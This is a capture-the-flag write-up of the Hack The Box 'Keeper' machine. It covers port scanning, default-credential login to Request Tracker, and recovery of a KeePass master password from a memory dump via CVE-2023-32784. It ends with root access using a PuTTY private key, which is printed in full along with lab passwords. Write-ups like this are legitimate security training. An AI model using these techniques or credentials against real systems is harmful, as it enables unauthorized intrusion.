---
machine: Keeper
platform: Hack The Box
category: Linux
difficulty: Easy
points: 20
tags: [default-credentials, request-tracker, keepass, cve-2023-32784, putty-key]
date: 2026-04-12
status: retired
summary: "A Linux box centred on a public-facing IT ticketing application and credential-store hygiene. It exercises virtual-host discovery, default-credential hunting against a web app, recovering secrets from a leaky password manager, and pivoting between SSH key formats to escalate."
---

## Enumeration

nmap scan:

```bash
─(kali㉿kali)-[~/htb/keeper]
└─$ nmap -sC -sV -p- -T4 -oN nmapscan 10.129.229.41
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 08:34 -0400
Stats: 0:06:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 49.20% done; ETC: 08:47 (0:06:16 remaining)
Stats: 0:06:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 49.20% done; ETC: 08:47 (0:06:16 remaining)
Stats: 0:06:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 49.20% done; ETC: 08:47 (0:06:16 remaining)
Stats: 0:06:28 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 51.90% done; ETC: 08:47 (0:05:56 remaining)
Stats: 0:09:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 74.04% done; ETC: 08:47 (0:03:21 remaining)
Stats: 0:10:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 80.72% done; ETC: 08:48 (0:02:31 remaining)
Nmap scan report for 10.129.229.41
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 805.07 seconds
```

Check out the website and theres a link to raise an IT ticket: `http://tickets.keeper.htb/rt/`

When you click on the link, however, it seems to hang and never actually successfully GET a site.

ffuf fuzz isn't finding anything: `ffuf -u http://10.129.229.41/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fc 301`

Running Wappalyzer we see it Nginx 1.18.0 running on Ubuntu

After adding the url/domain to the etc/hosts we find a request tracker website for the IT link.

## Foothold

After looking up default credentials we find default creds work.

Here we find a user lnorgaard and a default password `Welcome2023!`

When we ssh in with these credentials we get the user flag and we find a KeePass .kdbx file and a memory dump.

## Privilege Escalation

When we look up keepass .dmp memory vulnerability we come across a popular CVE in which bits of the master password would be leaked in plaintext.

So we find a PoC to exploit this for our .dmp file to try to recover the master key.

```text
Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 
3.:     d, 
4.:     g, 
5.:     r, 
6.:     ø, 
7.:     d, 
8.:      , 
9.:     m, 
10.:    e, 
11.:    d, 
12.:     , 
13.:    f, 
14.:    l, 
15.:    ø, 
16.:    d, 
17.:    e, 
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

We know most of the password as `dgrød med fløde` this exploit leaves off the first character or so though so we need to find that out ourselves.

We are going to use [keepassxc] to interface with our keypass file.

When we `keepassxc --keyfile ../passcodes.kdbx` and enter our `dgrød med fløde` password it fails.

As this seems to be a nordic password we look it up online to see if it matches closely to anything
![[Pasted image 20260514084122.png]]

So our password is probably `rødgrød med fløde`

#### ISSUE

This password above DOES NOT work despite it being the same as the one in the official writeup and obtained in the same manner.  If we look closer at the hex we can see why the author's password works and ours doesn't:

```bash
┌──(kali㉿kali)-[~/htb/keeper]
└─$ cat analyze       
rødgrød med fløde
rødgrød med fløde
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/htb/keeper]
└─$ xxd analyze          
00000000: 72c3 b864 6772 c3b8 6420 6d65 6420 666c  r..dgr..d med fl
00000010: c3b8 6465 0a72 c3b8 6467 72c3 b864 c2a0  ..de.r..dgr..d..
00000020: 6d65 64c2 a066 6cc3 b864 650a            med..fl..de.

```

the hex of the authors {d med fl} is : `6420 6d65 6420 666c`
while our {d med fl} is:                         `64 c2a0 6d65 64c2 a066 6c`

The authors use normal spaces hex: `20` while ours uses non-breaking space represented as: `C2 A0` so be sure to type the spaces in manually and do not copy paste them from google if solving this lab

When we get into the keepass database we see on the network that root has a password `F4><3K0nd!` and an entry with a PuTTY ssh.rsa key

We try to ssh in with the password and it fails

We can convert PuTTY to OpenSSH and use the key to ssh in.

```text
$ cat ptty.ppk 
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

We use `puttygen` to convert it to an openssh key we can try to use to sign in as root.

```bash
──(kali㉿kali)-[~/htb/keeper]
└─$ puttygen ptty.ppk -O private-openssh -o id_rsa

──(kali㉿kali)-[~/htb/keeper]
└─$ chmod 600 id_rsa

─(kali㉿kali)-[~/htb/keeper]
└─$ ssh -i id_rsa root@10.129.229.41               
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# 

```

We have successfully logged in with the private key and can get the administrator flag from the desktop.
